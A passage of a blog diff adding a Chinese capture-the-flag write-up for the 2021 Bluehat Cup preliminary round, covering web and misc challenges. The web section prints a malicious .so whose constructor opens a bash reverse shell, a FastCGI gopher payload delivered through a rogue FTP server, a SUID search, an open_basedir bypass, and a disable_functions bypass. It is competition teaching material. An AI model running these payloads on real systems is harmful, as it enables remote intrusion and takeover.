+                            'SERVER_ADDR' =&gt; '127.0.0.1',
+                            'SERVER_PORT' =&gt; '80',
+                            'SERVER_NAME' =&gt; 'localhost',
+                            'SERVER_PROTOCOL' =&gt; 'HTTP/1.1',
+                            'CONTENT_TYPE' =&gt; 'application/x-www-form-urlencoded',
+                            'CONTENT_LENGTH' =&gt; strlen($content),
+                                   ),
+                      $content
+                      );
+// 这次也不用二次编码了
+echo('gopher://127.0.0.1:9000/_'.str_replace("%2B", "+", ($res)));</code></pre><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>先写一个扩展</p>
+<pre><code>#define _GNU_SOURCE
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+__attribute__ ((__constructor__)) void preload (void){
+    system("bash -c 'bash -i &gt;&amp; /dev/tcp/xxxx/2333 0&gt;&amp;1'");
+}</code></pre><p>编译</p>
+<pre><code>gcc evil.c -fPIC -shared -o evil.so</code></pre><p>至此我们的恶意so文件生成完毕</p>
+<p>恶意so文件编译好上传后</p>
+<p>开启恶意ftp服务器</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094655.png" alt="image-20210502154725106"></p>
+<p>构造<code>file_put_contents</code></p>
+<pre><code>$file = $_GET['file'];
+$data = $_GET['data'];
+file_put_contents($file,$data);
+//http://7e653797-b723-4b3a-8977-5558bdd011e8.node3.buuoj.cn/shell.php?file=ftp://47.104.134.135:2334/anything&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%A5%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%16SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fuser.php%0B%09SCRIPT_NAME%2Fuser.php%0B%09REQUEST_URI%2Fuser.php%0F2PHP_ADMIN_VALUEextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Aextension+%3D+evil.so%0A%0F%11SERVER_SOFTWAREphp%2Ffastcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0C%21CONTENT_TYPEapplication%2Fx-www-form-urlencoded%0E%01CONTENT_LENGTH0%01%04%00%01%00%00%00%00%01%05%00%01%00%00%00%00
+//POST:
+//a=$file = $_GET['file'];$data = $_GET['data'];file_put_contents($file,$data);</code></pre><p>监听端口，发送请求即可收到shell</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094657.png" alt="image-20210502155201812"></p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094703.png" alt="image-20210502154940239"></p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094705.png" alt="image-20210502154952216"></p>
+<p>flag没权限</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094715.png" alt="image-20210502155046896"></p>
+<p>使用suid提权，查找有权限的命令</p>
+<pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094943.png" alt="image-20210502155438554"></p>
+<p><code>php -a</code>进入交互模式，进行绕过open_basedir并getflag</p>
+<pre><code>chdir('css');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo file_get_contents('/flag');</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094718.png" alt="image-20210502155624776"></p>
+<h3 id="更骚的办法"><a href="#更骚的办法" class="headerlink" title="更骚的办法"></a>更骚的办法</h3><p><a href="http://bubb1e.com/2021/04/29/蓝帽杯2021WP_WEB/#0x02-one-Pointer-php" target="_blank" rel="noopener">http://bubb1e.com/2021/04/29/%E8%93%9D%E5%B8%BD%E6%9D%AF2021WP_WEB/#0x02-one-Pointer-php</a></p>
+<p>除了<code>fsockopen</code>这个函数外，还有一个<code>pfsockopen</code></p>
+<p>这俩函数没啥区别</p>
+<p>这里只ban了<code>fsockopen</code></p>
+<p>所以我们可以通过将蚁剑插件中的<code>fsockopen</code>全部替换为<code>pfsockopen</code>达到getshell目的</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094720.png" alt="image-20210503224124644"></p>
+<p>然后加一个9001端口的选项</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094723.png" alt="image-20210503230321062"></p>
+<p>全部修改完后，重启蚁剑，先写个新的一句话<code>shell.php</code></p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094725.png" alt="image-20210503224150038"></p>
+<p>用蚁剑连接上这个新的，开启<code>bypass</code>插件</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094728.png" alt="image-20210503230407833"></p>
+<p><code>bypass_php_disable_functions</code>的fpm插件会上传.so文件，然后开启一个新的不使用php.ini的php进程并加载恶意so文件，来达到绕过<code>disable_functions</code>的操作</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094730.png" alt="image-20210503230627747"></p>
+<p>可以看到，蚁剑生成了一个新的<code>.antproxy.php</code></p>
+<p>这个php的作用是把流量转发到新开启的php进程</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094734.png" alt="image-20210503230656027"></p>
+<p>我们修改或新建蚁剑的链接如下</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094737.png" alt="image-20210503230735250"></p>
+<p>成功绕过，并且因为php本身suid有root权限，因此不用提权即可直接读取flag</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094739.png" alt="image-20210503230753903"></p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094743.png" alt="image-20210503230850304"></p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="冬奥会-is-coming"><a href="#冬奥会-is-coming" class="headerlink" title="冬奥会_is_coming"></a>冬奥会_is_coming</h2><p>分离图片，找到压缩包</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094750.png" alt="image-20210429115725329"></p>
+<p>解压出一个MP3，MP3最后面有密文</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094753.png" alt="image-20210429115819092"></p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094755.png" alt="image-20210429121542312"></p>
+<p>看看压缩包的注释，发现提示</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094759.png" alt="image-20210429120103164"></p>
+<p>考虑题目为<code>冬奥会_is_coming</code>，猜测密码为冬奥会开始日期<code>20220204</code></p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094802.png" alt="image-20210429120154731"></p>
+<p>解16进制</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094805.png" alt="image-20210429120549345"></p>
+<p>Google一搜，发现编码类型</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094808.png" alt="image-20210429120712293"></p>
+<p><a href="https://www.dcode.fr/wingdings-font" target="_blank" rel="noopener">https://www.dcode.fr/wingdings-font</a></p>
+<p>解出来这个</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094812.png" alt="image-20210429120908642"></p>
+<p>去github找相应的仓库<code>1cePeak</code></p>
+<p><a href="https://github.com/Tr0jAnV1rU4/1cePeak" target="_blank" rel="noopener">https://github.com/Tr0jAnV1rU4/1cePeak</a></p>
+<p>git clone下来，发现有被删除的文件，<code>checkout</code>一下</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094814.png" alt="image-20210429121142295"></p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094816.png" alt="image-20210429121201233"></p>
+<p>怀疑这是个key，想到第一步从mp3尾部解出的emoji，在线搜一下</p>
+<p><a href="https://miaotony.xyz/2021/02/11/CTF_2021NewsCTF/#toc-heading-5" target="_blank" rel="noopener">https://miaotony.xyz/2021/02/11/CTF_2021NewsCTF/#toc-heading-5</a></p>
+<p><a href="https://aghorler.github.io/emoji-aes/" target="_blank" rel="noopener">https://aghorler.github.io/emoji-aes/</a></p>
+<p>直接解出flag</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094818.png" alt="image-20210429121259016"></p>
+<h2 id="I-will-but-not-quite"><a href="#I-will-but-not-quite" class="headerlink" title="I_will_but_not_quite"></a>I_will_but_not_quite</h2><p>题目给了文件</p>
+<pre class="line-numbers language-Python"><code class="language-Python">#!/user/bin/python2
+import random
+def r(s, num):
+    l=""
+    for i in s:
+        if(ord(i) in range(97,97+26)):
+            l+=chr((ord(i)-97+num)%26+97)
+        else:
+            l+=i
+    return l
+
+def x(a, b):
+    return chr(ord(a)^ord(b))
+
+def encrypt(c):
+    secret = c
+    n=random.randint(1,1000)
+    for i in range(n):
+        secret = r(secret, random.randint(1,26))
+    secret = secret.encode('base64')
+
+    l = ""
+    for i in range(len(secret)):
+        l += x(secret[i], secret[(i+1)%len(secret)])
+    return l.encode('base64')
+
+flag = "#################"
+print "secret =", encrypt(flag)
+
+#secret = The key you got
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>解压出来是Twin.vmem，内存取证</p>
+<p>看系统版本，查文件列表</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094821.png" alt="image-20210503103925802"></p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094825.png" alt="image-20210503103935712"></p>
+<p>找所有的图片、压缩包，并提取</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094827.png" alt="image-20210503104046011"></p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094830.png" alt="image-20210503104055200"></p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094832.png" alt="image-20210503104545231"></p>
+<p>那个倒影.zip是UNCTF的题，不用看了，直接看sea.zip</p>
+<p>sea.zip中有注释：</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094835.png" alt="image-20210503104627426"></p>
+<p>暂时不知道啥意思，直接工具全试一遍，发现是outguess+弱口令</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094840.png" alt="image-20210503105146827"></p>
+<p>双十六进制编码，解出来既是密文</p>
+<p><a href="https://www.calcresult.com/misc/cyphers/twin-hex.html" target="_blank" rel="noopener">https://www.calcresult.com/misc/cyphers/twin-hex.html</a></p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094842.png" alt="image-20210503105940728"></p>
+<p>逆加密脚本，得解密脚本</p>
+<pre><code>secret = "Vnw3HC07BDgbBWNRGTx2fSckf399V1Z9CxIvHVd6fHsaEnR8fX40NyQ7JhM8CWV5fgMNN24="
+
+def r(s, num):
+    l = ""
+    for i in s:
+        if(ord(i) in range(97,97+26)):
+            l+=chr((ord(i)-97-num)%26+97)
+        else:
+            l+=i
+    return l
+
+def x(a, b):
+    return chr(ord(a)^ord(b))
+
+secret = secret.decode('base64')
+for i in range(97,123):
+    last_chr = chr(i)
+    tmp_flag = ''
+    tmp_flag += last_chr
+    for j in range(len(secret)):
+        tmp_flag += x(secret[j],tmp_flag[-1])
+    tmp_flag = tmp_flag[:-1]
+    try:
+        tmp_flag = tmp_flag.decode('base64')
+        for k in range(1,26):
+            flag = r(tmp_flag,k)
+            print flag
+    except:
+        pass</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094844.png" alt="image-20210503233833000"></p>
+<h2 id="嫌疑人x的硬盘"><a href="#嫌疑人x的硬盘" class="headerlink" title="嫌疑人x的硬盘"></a>嫌疑人x的硬盘</h2><p>这是取证题？</p>
+<p>给的镜像，有<code>bitlocker</code>，取证大师一把梭就能解</p>
+<p>找出来俩文件</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094450.png" alt="image-20210503234027021"></p>
+<p>逆向不会了</p>
+<p>[参考链接](<a href="http://www.rayi.vip/2021/05/02/第五届&quot;蓝帽杯&quot;" target="_blank" rel="noopener">http://www.rayi.vip/2021/05/02/第五届"蓝帽杯"</a> WriteUp/)</p>
 
                 
             </div>
@@ -650,7 +1246,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://marmalade.vip/nextthemebeautify2.html">https://marmalade.vip/nextthemebeautify2.html</a>
+                    <a href="https://marmalade.vip/bluehat2021chusai.html">https://marmalade.vip/bluehat2021chusai.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -688,16 +1284,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/next%E4%B8%BB%E9%A2%98/">
-                                    <span class="chip bg-color">next主题</span>
-                                </a>
-                            
-                                <a href="/tags/next%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/">
-                                    <span class="chip bg-color">next主题美化</span>
-                                </a>
-                            
-                                <a href="/tags/%E7%BD%91%E7%AB%99%E6%B7%BB%E5%8A%A0%E5%8A%9F%E8%83%BD/">
-                                    <span class="chip bg-color">网站添加功能</span>
+                                <a href="/tags/%E8%93%9D%E5%B8%BD%E6%9D%AF/">
+                                    <span class="chip bg-color">蓝帽杯</span>
                                 </a>
                             
                         </div>
@@ -1132,42 +1720,47 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/shodanuse.html">
+                <a href="/bluehat2021chusai.html">
                     <div class="card-image">
                         
+                        <img src="https://gitee.com/marmalade0/images/raw/master/www.marmalade.vip/background/3N_2OON@VASV_9~CI06R)CC.jpg" class="responsive-img" alt="第五届“蓝帽杯” 初赛WriteUp">
                         
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="互联网上最可怕的搜索引擎(Shodan)介绍及简单使用">
-                        
-                        <span class="card-title">互联网上最可怕的搜索引擎(Shodan)介绍及简单使用</span>
+                        <span class="card-title">第五届“蓝帽杯” 初赛WriteUp</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            互联网上最可怕的搜索引擎(Shodan)介绍及简单使用Shodan简介CNNMoney的一篇文章写道，虽然目前人们都认为谷歌是最强劲的搜索引擎，但Shodan才是互联网上最可怕的搜索引擎。下面简单介绍一下shodan和它的极其强大乃至恐怖的
+                            
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-04-14
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-14
+                            </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            lijunliang
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/writeup/" class="post-category">
+                                    writeup
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/shodan/">
-                        <span class="chip bg-color">shodan</span>
+                    <a href="/tags/%E8%93%9D%E5%B8%BD%E6%9D%AF/">
+                        <span class="chip bg-color">蓝帽杯</span>
                     </a>
                     
                 </div>
@@ -1181,33 +1774,30 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/nextthemebeautify1.html">
+                <a href="/minglingzhixingphpzhengzeraoguo.html">
                     <div class="card-image">
                         
+                        <img src="https://gitee.com/marmalade0/images/raw/master/www.marmalade.vip/background/meerkats-6153748_960_720.jpg" class="responsive-img" alt="命令执行中关于PHP正则表达式的一些绕过方法">
                         
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="Hexo+NexT(v7.72)博客主题美化，打造“超炫”网站（一）">
-                        
-                        <span class="card-title">Hexo+NexT(v7.72)博客主题美化，打造“超炫”网站（一）</span>
+                        <span class="card-title">命令执行中关于PHP正则表达式的一些绕过方法</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            安装好一个基本的next主题框架显然是有点简陋，许多普通网站的功能基本没有于是我亲试了一些常见美化博客的方法，让你的博客变得更“炫”！以下效果均在我的博客marmalade.vip中能够呈现出来
-
-在开始“大展身手”前，要注意一点：每添加了
+                            以[极客大挑战 2019]RCE ME为例，列举一些PHP正则的一些绕过方法
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-14
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-25
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/hexo-github%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%8B%E4%B8%8E%E7%BE%8E%E5%8C%96/" class="post-category">
-                                    hexo+github博客建立与美化
+                            <a href="/categories/web/" class="post-category">
+                                    web
                                 </a>
                             
                             
@@ -1217,16 +1807,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/next%E4%B8%BB%E9%A2%98/">
-                        <span class="chip bg-color">next主题</span>
-                    </a>
-                    
-                    <a href="/tags/next%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/">
-                        <span class="chip bg-color">next主题美化</span>
-                    </a>
-                    
-                    <a href="/tags/%E7%BD%91%E7%AB%99%E6%B7%BB%E5%8A%A0%E5%8A%9F%E8%83%BD/">
-                        <span class="chip bg-color">网站添加功能</span>
+                    <a href="/tags/%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87/">
+                        <span class="chip bg-color">正则绕过</span>
                     </a>
                     
                 </div>
